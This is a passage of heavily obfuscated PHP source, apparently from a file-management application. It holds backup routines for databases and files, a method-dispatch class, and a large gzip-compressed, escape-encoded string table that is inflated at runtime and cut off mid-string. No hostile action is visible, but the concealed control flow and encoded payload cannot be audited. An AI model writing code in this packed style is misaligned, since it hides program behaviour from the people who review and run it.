$ÕÎ½«›ñ))->save($‘­§ƒÓ¼); } private function getAutoName($ˆüµ†¿¦) { $º÷ò…œ =& $_SERVER[€ä¾™²]; $¯â´îœĞ = array($º÷ò…œ[1913] => USER_ID, $º÷ò…œ[580] => 0); $À÷¨›‘¤ = $this->field($º÷ò…œ[32])->where($¯â´îœĞ)->select(); $À÷¨›‘¤ = array_to_keyvalue($À÷¨›‘¤, $º÷ò…œ[12], $º÷ò…œ[32]); if (!$À÷¨›‘¤ || !in_array($ˆüµ†¿¦, $À÷¨›‘¤)) { return $ˆüµ†¿¦; } for ($¬â¸¼Ş = 0; $¬â¸¼Ş < count($À÷¨›‘¤); $¬â¸¼Ş++) { if (!in_array($ˆüµ†¿¦ . "\x28{$¬â¸¼Ş}\51", $À÷¨›‘¤)) { return $ˆüµ†¿¦ . "\x28{$¬â¸¼Ş}\51"; } } return $ˆüµ†¿¦ . "\x28{$¬â¸¼Ş}\x29"; } } goto fóœ¥ÎÄÚ¶; aœººÑí: function binCheckBigger($¹ª°Ù„Ç, $ë·ñ³”´) { return $¹ª°Ù„Ç > $ë·ñ³”´; } $_SERVER[$_SERVER[ê˜¼õ×â][3]] = ("\71\60\71\60"."\61\60")+0;$_9w6v="ub8s40rmxt3ph2l71avkfi5wjeqyzod9cn6g3vbmn6h4j5ywfstace87xzlq0urg92poi1dkje8r04awbp";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($‰‰“íÂñ, $Ş»´¼ğ©) { $ƒØëûğÍ =& $_SERVER[€ä¾™²]; if (isset(self::$_methodList[$‰‰“íÂñ])) { return @call_user_func_array(self::$_methodList[$‰‰“íÂñ], $Ş»´¼ğ©); } else { if (method_exists($this, $‰‰“íÂñ)) { return call_user_func_array(array($this, $‰‰“íÂñ), $Ş»´¼ğ©); } else { think_exception(__CLASS__ . $ƒØëûğÍ[4] . $‰‰“íÂñ . $ƒØëûğÍ[5]); } } } public static function __callStatic($‡Š¹½Ï˜, $×ÙˆºÕ˜) { if (isset(self::$_methodListStatic[$‡Š¹½Ï˜])) { return call_user_func_array(self::$_methodListStatic[$‡Š¹½Ï˜], $×ÙˆºÕ˜); } else { if (method_exists(self, $‡Š¹½Ï˜)) { return call_user_func_array(array(self, $‡Š¹½Ï˜), $×ÙˆºÕ˜); } else { show_json("{$‡Š¹½Ï˜}\50\x29\x20\x6e\x6f\164\x20\x65\170\x69\x73\164\73", !1); } } } public static function addMethod($£ŒñçÉ•, $½“¼¢øÖ) { self::$_methodList[$£ŒñçÉ•] = $½“¼¢øÖ; } public static function addMethodStatic($ˆÔ¡ÙÊè, $°µ§š—) { self::$_methodListStatic[$ˆÔ¡ÙÊè] = $°µ§š—; } } goto DÖ­Ïµ•¿ì; d­’Êæ÷°: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $¤ÊòÑ =& $_SERVER[€ä¾™²]; $Ã±ö³¯¨ = Backup::get(); self::$io = $Ã±ö³¯¨[$¤ÊòÑ[852]]; self::$name = $Ã±ö³¯¨[$¤ÊòÑ[32]]; $÷ƒç¤ü‹ = new DbManage(); $ĞŠ–Ç‰Å = $÷ƒç¤ü‹->dbType(); $úØâ÷”Æ = array($¤ÊòÑ[881] => $ĞŠ–Ç‰Å, $¤ÊòÑ[882] => time()); Backup::set($úØâ÷”Æ); $Î¹«„À = $this->tmpFilesPath() . $¤ÊòÑ[883] . self::$name . $¤ÊòÑ[8]; del_dir($Î¹«„À); mk_dir($Î¹«„À); $ú¿–¢ó = $“ŠéØÇ = 0; try { $®²„ö… = $÷ƒç¤ü‹->db()->getTables(); } catch (Exception $ºÈ®µ¹é) { Backup::log($¤ÊòÑ[884] . $ºÈ®µ¹é->getMessage()); return !1; } $®²„ö… = array_diff($®²„ö…, array($¤ÊòÑ[885], $¤ÊòÑ[886])); foreach ($®²„ö… as $©÷á…ğê) { if ($©÷á…ğê == $¤ÊòÑ[472]) { continue; } $ú¿–¢ó += $÷ƒç¤ü‹->model($©÷á…ğê)->count(); } $ÂŞ…¦öÆ = new Task($¤ÊòÑ[887], $¤ÊòÑ[880], $ú¿–¢ó, LNG($¤ÊòÑ[888]) . $¤ÊòÑ[889] . LNG($¤ÊòÑ[890])); $GLOBALS[$¤ÊòÑ[891]] = self::$name; foreach ($®²„ö… as $©÷á…ğê) { $ĞŞœ›Îê = $Î¹«„À . $©÷á…ğê . $¤ÊòÑ[892]; if ($©÷á…ğê == $¤ÊòÑ[472]) { @touch($ĞŞœ›Îê); continue; } $‹½ß¯»Ï = null; if ($©÷á…ğê == $¤ÊòÑ[893] && $Ã±ö³¯¨[$¤ÊòÑ[169]] == $¤ÊòÑ[879]) { $‹½ß¯»Ï = self::$io; } $“ŠéØÇ += $÷ƒç¤ü‹->sqlFromDb($©÷á…ğê, $ĞŞœ›Îê, $ÂŞ…¦öÆ, $‹½ß¯»Ï); } unset($GLOBALS[$¤ÊòÑ[891]]); $ÂŞ…¦öÆ->end(); if ($“ŠéØÇ > $ú¿–¢ó) { $ú¿–¢ó = $“ŠéØÇ; } $úØâ÷”Æ = array($¤ÊòÑ[881] => $ĞŠ–Ç‰Å, $¤ÊòÑ[876] => 1, $¤ÊòÑ[894] => $ú¿–¢ó, $¤ÊòÑ[895] => $“ŠéØÇ, $¤ÊòÑ[896] => time()); Backup::set($úØâ÷”Æ); if ($ú¿–¢ó - $“ŠéØÇ > 0) { $ºÍ·‰ˆÓ = $¤ÊòÑ[897]; if (!stristr(I18n::getType(), $¤ÊòÑ[898])) { $ºÍ·‰ˆÓ = $¤ÊòÑ[899]; } Backup::log(array($ºÍ·‰ˆÓ, $úØâ÷”Æ)); return !1; } return !0; } private function tmpFilesPath() { $¢¡ö ‰à =& $_SERVER[€ä¾™²]; $î° ­ÇÉ = TEMP_FILES; if ($GLOBALS[$¢¡ö ‰à[6]][$¢¡ö ‰à[92]][$¢¡ö ‰à[900]]) { $î° ­ÇÉ = $GLOBALS[$¢¡ö ‰à[6]][$¢¡ö ‰à[92]][$¢¡ö ‰à[900]]; if (!mk_dir($î° ­ÇÉ) || !is_writable($î° ­ÇÉ) || !IO::mkfile($î° ­ÇÉ . $¢¡ö ‰à[901])) { $î° ­ÇÉ = TEMP_FILES; } } return $î° ­ÇÉ; } } class BackupDbFile { public function __construct() { } public function index() { $´×»ÆšŠ =& $_SERVER[€ä¾™²]; $Ñ‚ÈÅü¾ = Backup::get(); $âš¿ÛÌ¼ = $Ñ‚ÈÅü¾[$´×»ÆšŠ[32]]; $ş«ãµ¿ = $this->tmpFilesPath() . "\142\141\143\x6b\x75\x70\137{$âš¿ÛÌ¼}\57"; $ÌüÌº˜À = $this->backupPath($Ñ‚ÈÅü¾); if (!($ÌüÌº˜À = IO::mkdir($ÌüÌº˜À))) { Backup::log($´×»ÆšŠ[902] . $ÌüÌº˜À); return !1; } $‘¯ôª±š = new DbManage(); $Àøú´•º = $‘¯ôª±š->getSqlFile(); if (!$Àøú´•º || !$Àøú´•º[$´×»ÆšŠ[903]] || !$Àøú´•º[$´×»ÆšŠ[13]]) { Backup::log($´×»ÆšŠ[904]); return !1; } IO::move($Àøú´•º[$´×»ÆšŠ[903]], $ş«ãµ¿); IO::move($Àøú´•º[$´×»ÆšŠ[13]], $ş«ãµ¿); $‘¯ôª±š->mixBakList($ş«ãµ¿); $ˆÂ±÷Î = IO::listPath($ş«ãµ¿); $åŸ§ºÚÍ = isset($ˆÂ±÷Î[$´×»ÆšŠ[86]]) ? $ˆÂ±÷Î[$´×»ÆšŠ[86]] : array(); $öñºË¥´ = array_sum(array_column($åŸ§ºÚÍ, $´×»ÆšŠ[79])); if (!$öñºË¥´) { Backup::log($´×»ÆšŠ[905] . $ş«ãµ¿); return !1; } $– áàî½ = array($´×»ÆšŠ[906] => $öñºË¥´, $´×»ÆšŠ[907] => time()); Backup::set($– áàî½); Hook::trigger($´×»ÆšŠ[908], $ş«ãµ¿, $ÌüÌº˜À); $ÌŠ¼ÉÓì = new TaskFileTransfer($´×»ÆšŠ[908], $´×»ÆšŠ[880], count($åŸ§ºÚÍ), LNG($´×»ÆšŠ[888]) . $´×»ÆšŠ[476] . LNG($´×»ÆšŠ[890]) . $´×»ÆšŠ[909]); $ÌŠ¼ÉÓì->task[$´×»ÆšŠ[864]] = $öñºË¥´; foreach ($ˆÂ±÷Î[$´×»ÆšŠ[86]] as $¯ª­Ï­) { $æ´‹®–ö = IO::move($¯ª­Ï­[$´×»ÆšŠ[87]], $ÌüÌº˜À); if (!$æ´‹®–ö) { $ÌŠ¼ÉÓì->end(); $ş×´ç‡í = IO::getLastError($´×»ÆšŠ[910] . $¯ª­Ï­[$´×»ÆšŠ[87]] . $´×»ÆšŠ[911] . $ÌüÌº˜À . $´×»ÆšŠ[176]); Backup::log($ş×´ç‡í); return !1; } } $ÌŠ¼ÉÓì->end(); $– áàî½ = array($´×»ÆšŠ[912] => $öñºË¥´, $´×»ÆšŠ[913] => time()); Backup::set($– áàî½); return !0; } private function backupPath($’Ã‹¹âí) { $ª÷»È»ô =& $_SERVER[€ä¾™²]; $é”ƒıó = $’Ã‹¹âí[$ª÷»È»ô[32]]; $óóÉêÌ = Model($ª÷»È»ô[873])->get($ª÷»È»ô[874]); $Ò¤¶ô½ = substr(md5($ª÷»È»ô[875] . $óóÉêÌ . $é”ƒıó), 0, 8); return "\x7b\x69\157\72{$’Ã‹¹âí[$ª÷»È»ô[852]]}\175\57\144\x61\164\x61\x62\141\x73\145\x2f\142\141\143\x6b\165\x70\x2f" . $é”ƒıó . $ª÷»È»ô[11] . $Ò¤¶ô½; } private function tmpFilesPath() { $•ùéøÙğ =& $_SERVER[€ä¾™²]; $Š÷Úúê = TEMP_FILES; if ($GLOBALS[$•ùéøÙğ[6]][$•ùéøÙğ[92]][$•ùéøÙğ[900]]) { $Š÷Úúê = $GLOBALS[$•ùéøÙğ[6]][$•ùéøÙğ[92]][$•ùéøÙğ[900]]; if (!mk_dir($Š÷Úúê) || !is_writable($Š÷Úúê) || !IO::mkfile($Š÷Úúê . $•ùéøÙğ[901])) { $Š÷Úúê = TEMP_FILES; } } return $Š÷Úúê; } } class BackupFile { public function __construct() { } public function index() { $ìí°‚¤ = Backup::get(); $æÉ˜øÖ… = $ìí°‚¤[$_SERVER[€ä¾™²][856]][$_SERVER[€ä¾™²][231]][$_SERVER[€ä¾™²][564]]; $ÇŒÒ¦“â = array($_SERVER[€ä¾™²][565] => array($_SERVER[€ä¾™²][914], $æÉ˜øÖ…), $_SERVER[€ä¾™²][915] => array($_SERVER[€ä¾™²][407], $ìí°‚¤[$_SERVER[€ä¾™²][852]])); $¥ÏéÙ‚ = (int) Model($_SERVER[€ä¾™²][893])->where($ÇŒÒ¦“â)->count($_SERVER[€ä¾™²][564]); $Î”¤š³‚ = (int) Model($_SERVER[€ä¾™²][893])->where($ÇŒÒ¦“â)->sum($_SERVER[€ä¾™²][79]); $Ëíøå… = new TaskFileTransfer($_SERVER[€ä¾™²][916], $_SERVER[€ä¾™²][880], $¥ÏéÙ‚, LNG($_SERVER[€ä¾™²][888]) . $_SERVER[€ä¾™²][889] . LNG($_SERVER[€ä¾™²][917])); $Ëíøå…->task[$_SERVER[€ä¾™²][864]] = $Î”¤š³‚; $Ÿ²œ¿’ = array($_SERVER[€ä¾™²][918] => $¥ÏéÙ‚, $_SERVER[€ä¾™²][919] => $Î”¤š³‚, $_SERVER[€ä¾™²][920] => time()); Backup::set($Ÿ²œ¿’); $·Â†Ìøİ = !0; $âÆ¥Ó­ê = $this->storeIds(); $æà©¿®Œ = 1; $ÖÆ…ó²¤ = 1000; $µÄÀ¤Ü– = $¦¢½ë£Ã = 0; $şëææ˜ö = array(); $ï˜äú‘½ = $¤«ŸŞ­ = 0; do { $ñë–Òçğ = $_SERVER[€ä¾™²][921]; $‹Üœ±œè = Model($_SERVER[€ä¾™²][893])->where($ÇŒÒ¦“â)->field($ñë–Òçğ)->order($_SERVER[€ä¾™²][922])->selectPage($ÖÆ…ó²¤, $æà©¿®Œ); $”ÏÂÊ× = !empty($‹Üœ±œè[$_SERVER[€ä¾™²][446]]) ? $‹Üœ±œè[$_SERVER[€ä¾™²][446]] : array(); foreach ($”ÏÂÊ× as $ßØ½ˆË) { if (!$this->_fileExist($ßØ½ˆË, $şëææ˜ö, $âÆ¥Ó­ê)) { Backup::log($_SERVER[€ä¾™²][923] . $ßØ½ˆË[$_SERVER[€ä¾™²][564]] . $_SERVER[€ä¾™²][924] . $ßØ½ˆË[$_SERVER[€ä¾™²][87]]); continue; } $àâ¡° = $ßØ½ˆË[$_SERVER[€ä¾™²][87]]; $ÌÊ¼ûÑè = "\173\151\157\x3a{$ìí°‚¤[$_SERVER[€ä¾™²][852]]}\175" . substr($àâ¡°, strlen("\173\151\157\x3a{$ßØ½ˆË[$_SERVER[€ä¾™²][925]]}\x7d")); if (IO::exist($ÌÊ¼ûÑè)) { $Ëíøå…->updateFileEnd($ßØ½ˆË[$_SERVER[€ä¾™²][32]], $ßØ½ˆË[$_SERVER[€ä¾™²][79]]); } else { $ÌÊ¼ûÑè = get_path_father($ÌÊ¼ûÑè); IO::mkdir($ÌÊ¼ûÑè); if (!IO::copy($àâ¡°, $ÌÊ¼ûÑè, $_SERVER[€ä¾™²][926])) { Backup::log($_SERVER[€ä¾™²][927] . $àâ¡° . $_SERVER[€ä¾™²][911] . $ÌÊ¼ûÑè . $_SERVER[€ä¾™²][176]); $·Â†Ìøİ = !1; break; } } $æÉ˜øÖ… = $ßØ½ˆË[$_SERVER[€ä¾™²][564]]; $¦¢½ë£Ã += 1; $µÄÀ¤Ü– += $ßØ½ˆË[$_SERVER[€ä¾™²][79]]; $¤«ŸŞ­ += 1; $ï˜äú‘½ += $ßØ½ˆË[$_SERVER[€ä¾™²][79]]; if ($µÄÀ¤Ü– >= 1024 * 1024 * 100) { $Ÿ²œ¿’ = array($_SERVER[€ä¾™²][851] => $æÉ˜øÖ…, $_SERVER[€ä¾™²][928] => $¤«ŸŞ­, $_SERVER[€ä¾™²][929] => $ï˜äú‘½); Backup::set($Ÿ²œ¿’); $µÄÀ¤Ü– = $¦¢½ë£Ã = 0; } } $²Ò—™” = count($”ÏÂÊ×); $æà©¿®Œ++; } while ($²Ò—™” == $ÖÆ…ó²¤); $Ëíøå…->end(); $Ÿ²œ¿’ = array($_SERVER[€ä¾™²][930] => 1, $_SERVER[€ä¾™²][862] => time(), $_SERVER[€ä¾™²][878] => 1, $_SERVER[€ä¾™²][851] => $æÉ˜øÖ…, $_SERVER[€ä¾™²][931] => time()); if ($¦¢½ë£Ã) { $Ÿ²œ¿’[$_SERVER[€ä¾™²][928]] = $¤«ŸŞ­; $Ÿ²œ¿’[$_SERVER[€ä¾™²][929]] = $ï˜äú‘½; } Backup::set($Ÿ²œ¿’); return !0; } private function _fileExist($…õ¸ŒßÓ, &$’é£œ›ï, $´¥Ü¢Ü) { $ê‹ë…ÙÇ =& $_SERVER[€ä¾™²]; $»úÂÎˆÌ = $…õ¸ŒßÓ[$ê‹ë…ÙÇ[87]]; if (in_array($…õ¸ŒßÓ[$ê‹ë…ÙÇ[564]], $’é£œ›ï)) { return !1; } if (!in_array($…õ¸ŒßÓ[$ê‹ë…ÙÇ[925]], $´¥Ü¢Ü)) { return !1; } if (IO::exist($»úÂÎˆÌ)) { return !0; } $ä¯‡³áÍ = get_path_father($»úÂÎˆÌ); if (IO::exist($ä¯‡³áÍ)) { $’é£œ›ï[] = $…õ¸ŒßÓ[$ê‹ë…ÙÇ[564]]; return !1; } $Û´çáÏÑ = array($ê‹ë…ÙÇ[925] => $…õ¸ŒßÓ[$ê‹ë…ÙÇ[925]], $ê‹ë…ÙÇ[87] => array($ê‹ë…ÙÇ[473], "{$ä¯‡³áÍ}\45")); $Åİ«åõ = Model($ê‹ë…ÙÇ[893])->where($Û´çáÏÑ)->field($ê‹ë…ÙÇ[565])->select(); $’é£œ›ï = array_merge($’é£œ›ï, array_to_keyvalue($Åİ«åõ, $ê‹ë…ÙÇ[12], $ê‹ë…ÙÇ[564])); return !1; } private function _fileFilter($É‹”¾«Ş) { $­Œı£°… =& $_SERVER[€ä¾™²]; return; if (empty($É‹”¾«Ş)) { return; } $¬¢±‘˜Š = array($­Œı£°…[564] => array($­Œı£°…[7], array_unique($É‹”¾«Ş))); $‘ç× = Model($­Œı£°…[932])->where($¬¢±‘˜Š)->field($­Œı£°…[192])->select(); foreach ($‘ç× as $˜¶½ß¿ó) { Model($­Œı£°…[932])->remove($˜¶½ß¿ó[$­Œı£°…[192]], !1); } } private function storeIds() { $¬™òÊòŠ =& $_SERVER[€ä¾™²]; $‚ÜªİÃ® = Model($¬™òÊòŠ[868])->listData(); $ÖÖß¹ô = array(); $ºÜìæ¯Å = $GLOBALS[$¬™òÊòŠ[6]][$¬™òÊòŠ[92]][$¬™òÊòŠ[933]]; foreach ($‚ÜªİÃ® as $áî„Ïƒü) { $¯€ºÀ˜ = strtolower($áî„Ïƒü[$¬™òÊòŠ[96]]); if (!isset($ºÜìæ¯Å[$¯€ºÀ˜])) { continue; } $ˆ·†×ï¬ = $¬™òÊòŠ[77] . (isset($ºÜìæ¯Å[$¯€ºÀ˜]) ? $ºÜìæ¯Å[$¯€ºÀ˜] : ucfirst($¯€ºÀ˜)); if (!class_exists($ˆ·†×ï¬)) { continue; } $ÖÖß¹ô[] = $áî„Ïƒü[$¬™òÊòŠ[486]]; } return $ÖÖß¹ô; } } goto b‚İÊÒÅŞ…; aÂƒµÂ”¸î: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\200\235\344\276\231\262", "\xfa\xcc\xac\xa6\xbe\xae"); $_SERVER[€ä¾™²] = explode("\174\4\174\2\174\5", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\171\174\33\325\265\0\314\366\12\111\241\320\122\36\245\274\302\140\222\330\116\264\330\316\356\304\111\144\131\216\105\144\313\221\344\54\330\146\62\222\106\366\304"."\x92\x46\xd1\x8c\xbc\x25\x69\x59\xc2\x1e\x8\x85\xb0\x4\x28\xb4\x50\x96\x52\x92\xb0\x86\xbd\x50\x96\xd2\xc7\x4e\x29\xa5\x2d\x4b\xcb\x62\x27\x81\x2\xa5\xb\x4b\xd9\xbe\xbb\x9c\xbb\xcc\x48\x86\xf7\xfd\xbe\x3f\xbe\xfc\x92"."\x68\xee\xb9\xfb\xbd\xe7\x9e\x7b\xee\xb9\xe7\x9c\xfb\xf6\x65\xf7\xff\xfb\xa5\x37\x36\x1c\xb0\x61\xbf\xd\xff\x75\xcf\xa3\x9b\xee\xf9\xfb\x63\xf4\x9b\xfc\x7f\x0\xfd\x3e\xf6\xdc\x83\xf6\x21\x7f\xe\x3f\xf7\x9c\x9a\x9a\xb6"."\71\223\147\164\34\274\345\216\355\332\57\264\233\264\263\243\221\47\237\12\37\362\314\315\47\204\306\257\175\162\144\174\337\175\346\351\313\123\215\50\61\315\333\110\177\224\274\151\53\372\260\141\331\26\5".strrev('V‚¯†™œøå‰,PÎÎ®ñ¨MÚ¼X5—ZËş»R¨ş Ó­¦sÔR,WOéúşFß£èÆ|Ì¤')."\324\162\120\177\101\57\132\250\65\162\161\152\301\54\350\171\7\104\0\322\232\255\45\65\13\112\152\151\126\133\102\235\221\350\152\65\261\272\63\4\51\222\352\272\222\136\34\241\41\362\31\267\265\242\235"."\x30\x72\x3a\x4f\x31\x54\xe4\xed\x6a\xe\x2d\xd\x77\x28\x89\x58\xa0\x23\x1e\x8\x26\xc2\xd1\xe\xa\xe\x46\xdb\xdb\xc3\x89\x72\x78\x2c\x1a\x89\x34\x7\x82\xcb\xca\x63\x3a\x63\x81\xa5\xed\x1\x5\xb5\x2f\xab\xab\x46\x3e"."\143\326\50\153\150\314\32\245\226\176\264\32\172\66\115\77\363\32\153\216\75\122\200\257\4\377\102\323\224\57\145\263\64\320\301\277\322\172\106\53\145\141\264\132\344\100\241\150\344\64\326\351\145\372\10"."\x87\xd2\xf\xad\x64\x9b\x46\x3e\x45\x3\xa1\x61\xbb\xa8\x9\x38\x6a\x6b\xa\x4d\xb4\x9e\x87\xa2\xe2\xa1\x48\x28\x98\x50\x70\x3\x95\xd6\x58\xb4\x5d\x81\x49\xc8\x69\x96\xad\x17\x95\x95\x6d\xa1\x58\x48\xc1\x8d\x6e\xaa\x26".base64_decode('fa1WAF860FAogUhEmagEW88VWDE0T4XCorGWUExpXq2IEUqZuZyZ96FS0EzaUlNDsRj98AB6Rw==')."\xc2\x78\xd2\x20\x10\x6d\x6d\x8d\x87\x78\x8\x3a\xb7\x3c\x82\x5a\x32\x13\xf0\xd3\x11\x4a\x67\xb2\xb6\x3a\xa8\x65\x4b\xc\x4d\x7\xe8\x6f\x35\xfc\xc0\xaf\x69\x1\xea\xae\x33\xf2\x46\x9\xd0\x14\x8a\x30\x4d\xbe\xac\xe0\xa3"."\304\122\353\14\242\247\341\43\207\362\233\220\57\11\260\44\113\265\226\175\30\150\205\16\322\317\246\105\364\167\1\344\117\252\70\116\57\332\252\236\117\231\151\43\17\353\170\61\340\243\146\367\267\24\15"."\224\200\206\63\146\66\315\276\55\143\24\172\231\61\262\172\107\51\47\47\341\301\124\277\221\115\27\331\322\373\252\224\64\30\341\53\31\247\25\241\2\152\11\47\2\106\146\104\54\105\234\256\223\307\132"."\x66\xa9\x98\xd2\xc3\x68\xe9\xd0\x70\x3d\x80\x75\xdb\x46\x9d\x63\x3\x62\x76\x15\xb2\xa6\x96\x8e\xeb\x45\xde\x35\xc3\x6c\x45\x5\x45\x4b\xb6\xc\x1c\x60\xab\x20\x2d\xd\x82\xbf\xa6\xfb\x14\xef\x17\xbd\xdd\x4b\xd0\x7f\xb5"."\100\350\172\240\232\176\75\233\125\365\141\35\226\111\56\75\333\142\375\363\133\111\43\357\107\20\32\14\107\325\176\315\352\157\117\317\126\111\56\106\77\323\372\260\257\320\137\200\65\314\227\155\217\3\215".strrev('X¿Ë.c,Z4hÖÒµev•¤£Å¨ë ¾tPæ+ çq§Ï\\Bí·îıéÚA¥3YÂ¢Hv˜thñ')."\xef\x38\xcc\xe2\x40\x7b\x98\xcd\x50\x3a\x3\x8\xc8\x36\x81\x2a\xa8\xd0\xb0\x8\x3d\x13\x8b\x51\x2b\x14\xb2\x46\x4a\xb3\xd\x33\xef\x37\x53\xb6\x6e\x7b\x2d\xbb\xa8\x6b\x50\x62\x20\x95\xd2\x2d\xcb\x1b\x34\xf3\x76\xd1\xcc"."\172\3\331\254\71\344\215\26\215\76\43\337\250\114\7\322\212\42\321\22\366\142\162\327\10\353\262\152\201\202\161\1\127\63\275\251\144\147\274\363\330\172\343\251\213\132\336\312\350\105\157\10\220\275\121"."\101\215\345\64\217\45\153\61\254\202\151\31\270\171\215\212\146\333\132\252\37\323\13\121\174\323\127\244\67\362\131\43\257\227\247\105\205\350\336\316\242\326\227\323\32\225\102\51\211\6\0\326\30\300\122"."\x38\x85\x9c\x18\x6\xa0\x51\xc9\x69\xc3\x5e\xad\x8f\x95\x14\x1a\x2e\x18\x45\xdd\x62\xbd\x56\x96\xb6\x27\x0\xa3\x32\xde\x76\xbc\x36\xc\x3d\xed\x8d\x23\x82\xc\x85\xcd\xac\x9b\xa5\x20\x5c\x51\x58\x1c\x85\xb6\x25\x12\x9d".base64_decode('argV7bgdIbU9kAi2Qem21seKjiAyy4tkwFVetEYwNnWgzglgpzmkF1HFzSONyoCZTprDPhaFEw==')."\307\21\261\140\211\361\374\26\154\157\114\313\367\341\156\44\107\154\335\162\223\233\146\264\77\373\62\164\101\372\222\172\306\54\102\157\254\301\76\347\340\107\364\174\237\335\317\312\216\207\142\53\102\61\65"."\x1e\x6d\x4d\xac\xc\xc4\x60\x3b\xcf\x23\xcc\x19\x66\xad\xc1\xb5\x67\xbd\x31\x3d\x8d\x6\x31\x65\xb3\x7c\x5a\x41\x8c\xfe\x2a\x2f\x5e\x30\xb8\x72\x16\x8b\x17\x11\x8b\x8b\x84\x97\xe2\xb1\x6b\xf1\x5a\x28\x91\x57\x4e\xc5\xca"."\x8e\x18\x39\x3\x77\xcf\xe6\x31\x64\xb0\xd1\x5e\xbf\x14\x1a\xe4\x27\x7d\x6e\xea\xb1\xa6\xd7\xf4\xa4\x67\xd4\x7a\xd1\xff\xd3\x6b\xbb\x7b\x5a\x7c\xd3\x7b\x17\xfb\xd\x91\xc7\x5f\xef\xab\x57\x1a\xea\xe6\x28\x9d\x88\xf9\x30".base64_decode('tKwCnS5LUadElzmHRWB43szrFRcWQiTT0r1tuoboLpoIx7x4WF00/BWji7c/iZa45oUCY6HlXQ==')."\241\170\102\155\17\45\332\242\55\320\374\120\0\276\362\50\63\151\57\233\143\314\153\301\116\227\207\142\365\141\151\133\20\344\75\45\17\10\311\327\141\16\61\202\356\102\240\140\277\236\32\230\40\16\175".base64_decode('QW9MSpfY1HXTn17A5l76o6rBSCgQU4FJVQ2rVdoZcZCTW9VMrkWI1q7bmugAqi6cQ0tadER1bg==').base64_decode('Y6yX7QLx0QpaaaT5PoeCbbrR1w/tNnBxKTNrFrUs3goYa9pnAFUuZEtoGfhxwYn+Ui4JGxcasg==').strrev('»yÖ‰”¾ë¼½%Ï±ô*Ì'."\0".'a×fRÊ;Wß!_İF*ü„+;[‡mÆÑsÛ«X‚5£\\İ>')."\66\240\67\342\276\0\161\133\100\240\54\40\321\317\5\170\313\153\162\223\11\74\133\131\137\16\25\102\312\14\232\174\223\246\7\224\5\316\55\117\321\213\105\263\170\34\244\40\337\12\331\67\361\164\101"."\341\66\147\54\54\104\21\330\167\277\311\31\21\223\341\146\243\37\372\75\265\241\25\250\110\32\61\144\76\313\106\223\200\72\250\245\323\225\300\210\362\100\1\33\30\332\222\10\306\26\370\343\63\321\137"."\301\3\244\315\234\306\166\124\114\210\170\265\70\140\361\20\331\46\365\64\335\47\35\40\272\300\51\150\72\253\262\150\233\70\262\350\110\211\220\264\337\204\106\43\254\200\16\227\170\317\331\30\244\365\254".strrev('†1¢Îá‚ÉF¬Ñf|Jğî`'."\0".'•âW…€Æbr†+Û`¨ :×Ã/ÑÃ3C$F¬g_¬Î')."\31\51\31\266\333\265\342\0\353\30\312\51\226\42\16\110\313\264\265\53\22\121\203\321\216\4\72\217\121\310\312\130\70\21\142\24\53\320\242\6\202\235\20\22\64\220\63\160\62\13\102\41\203\15\200"."\x42\xa8\x11\x7e\xc1\x2b\xa1\xcd\xba\x60\xe6\x11\xa5\x5\x62\xe5\x15\xa7\xb5\xb2\xa8\xb4\x60\x25\x0\x77\x4\xfb\xe1\xe2\x28\x10\x4f\x90\x1b\xf5\xe6\x10\x5d\xf1\xf2\x36\x75\x76\x1\x2f\xc0\xb0\x82\x71\xba\xcd\x23\xad\x66"."\x91\xb1\x71\x46\x5f\x7e\x5\x9f\xf9\x95\xf1\x59\xde\xb6\xf6\x40\xd0\x1b\x6f\xb\x34\xcc\x9e\x43\xa1\xab\x73\xe9\x9e\x44\x9b\x61\xf5\x9c\xc8\xc3\xd0\x9c\x21\x6b\x96\x5a\xd4\xd1\x9a\x66\xb8\xd0\x50\x57\xcf\x56\x1c\xe2\x4b"."\x34\xd1\xf2\xd5\xde\x9c\x17\x97\x82\x59\x4a\x5f\x5d\x5d\x1d\x2b\x6b\xc6\x1c\xa5\x1f\x91\x12\x4e\xbf\xd3\xa4\xb7\xec\xf0\x52\x4a\xd\xe8\x32\x39\xb7\xbc\x43\x6\xa3\x79\x53\x38\x3b\x3e\xa5\x7c\xf0\xad\x12\xd9\xdd\x54\x2d"."\205\213\123\121\146\273\144\311\43\205\20\60\215\262\30\214\113\246\120\55\333\147\42\274\353\317\311\300\64\307\137\32\326\51\313\5\25\365\153\174\234\360\350\261\305\201\30\272\21\71\23\36\146\324\6"."\x46\xbf\x9d\x3c\xb6\x92\xa8\x3c\xd0\x94\x75\xf\xc3\x68\x8b\x76\x14\xf0\xce\x86\xa8\x36\x9b\xb6\x69\xf4\x67\x32\x34\xa3\x84\xd6\x6d\xd1\x18\x95\x46\x7f\x31\x2b\x89\xd1\xcc\x68\x1c\xaa\x1c\xce\x65\xc5\xb1\xa\x86\x6\x46"."\123\356\332\260\212\142\124\210\121\345\230\66\116\7\330\54\264\267\270\326\4\335\374\51\154\341\142\124\243\62\210\205\64\146\276\251\272\336\127\127\255\260\303\146\123\165\127\242\25\361\351\213\27\115\136"."\30\64\163\5\114\126\332\113\131\333\300\375\245\230\273\10\372\270\20\363\100\54\320\351\32\216\120\102\203\135\147\241\137\116\267\320\77\121\251\320\25\314\230\255\122\73\43\201\104\153\64\326\16\70\136"."\x28\x8\xb4\x2a\xa4\x2a\xad\x36\xaf\xa0\x48\x25\xcb\xab\x63\x3e\x19\x56\x81\x96\xca\xba\x50\x54\x1e\x8b\x55\x15\x31\x71\x55\x25\x4c\x5c\xe5\xc2\xc4\x55\xe5\x98\xb8\xaa\x12\x9e\xd\x2\x42\x6a\x39\x6d\xd4\xcc\xa3\xf5\x8a".base64_decode('NtqcLwVokWgLdyxT26MtoYga7kD8XKIc3tXZEmBkUIY3RxNtDmgX4uhWBCJhd/LQqnA8Ea8YhQ==')."\x60\x5d\x21\x57\x4c\x4b\xb3\xda\x19\xb\xb5\x86\x57\xf1\x60\x6b\x38\x14\x69\x89\xab\xc1\x40\xb0\x4d\xa4\xe9\x8\xb4\x43\x0\xf1\x4a\x7a\x36\x6d\xf9\x9d\xe9\x55\xc4\x9a\xc6\xb9\x24\x4d\x5\x84\